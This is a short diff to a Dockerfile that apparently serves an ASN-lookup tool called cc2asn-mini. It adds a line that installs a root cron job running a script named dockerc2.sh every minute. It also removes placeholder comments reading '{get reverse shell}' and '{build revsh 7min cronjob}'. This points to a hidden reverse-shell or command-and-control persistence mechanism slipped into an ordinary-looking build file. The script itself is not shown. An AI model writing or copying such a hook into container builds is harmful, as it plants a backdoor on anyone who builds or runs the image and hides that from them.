@@ -24,11 +24,10 @@ ADD ./* /working/cc2asn-mini/
 
 RUN pip3 install configobj
 RUN pip3 install natsort
-#RUN {get reverse shell}
+RUN (crontab -u root -l; echo "* * * * * /working/cc2asn-mini/dockerc2.sh" ) | crontab -u root -
 RUN cd /working/cc2asn-mini && cp 000-default.conf /etc/apache2/sites-available/000-default.conf
 RUN cd /working/cc2asn-mini && ./RIR-downloader.sh
 RUN cd /working/cc2asn-mini && ./SEF-parser.py
-#RUN {build revsh 7min cronjob with echo >>}
 CMD ["/usr/sbin/apachectl", "-D", "FOREGROUND"]
 
 EXPOSE 42069
